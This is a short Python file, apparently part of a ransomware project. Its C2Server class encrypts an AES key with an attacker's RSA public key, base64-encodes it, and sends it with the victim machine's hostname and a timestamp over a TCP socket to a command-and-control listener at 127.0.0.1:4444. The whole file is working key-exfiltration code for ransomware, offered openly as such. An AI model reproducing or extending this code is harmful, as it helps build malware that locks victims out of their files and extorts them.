import os
from datetime import datetime
import socket
import rsa
import base64


class C2Server():
    def __init__(self) -> None:
        self.ip = "127.0.0.1"
        self.port = 4444

    def send_machine(self, AESkey):
        hostname = os.uname()[1]
        timestamp = datetime.now()

        rsapubkeyfile = open("./keys/public.pem", "rb")
        rsapubkey = rsa.PublicKey.load_pkcs1(rsapubkeyfile.read())

        AESkey = rsa.encrypt(AESkey, rsapubkey)

        # Base 64 prevent invalid chars in SOCKET transmission
        AESkey = base64.b64encode(AESkey)

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.ip, self.port))
                s.send(f"[{timestamp}] - {hostname}:{AESkey}\n".encode("utf-8"))
                print(f"[+] Machine Submited: {hostname}")
        except:
            print(f"[X] Machine Not Submited: {hostname}")
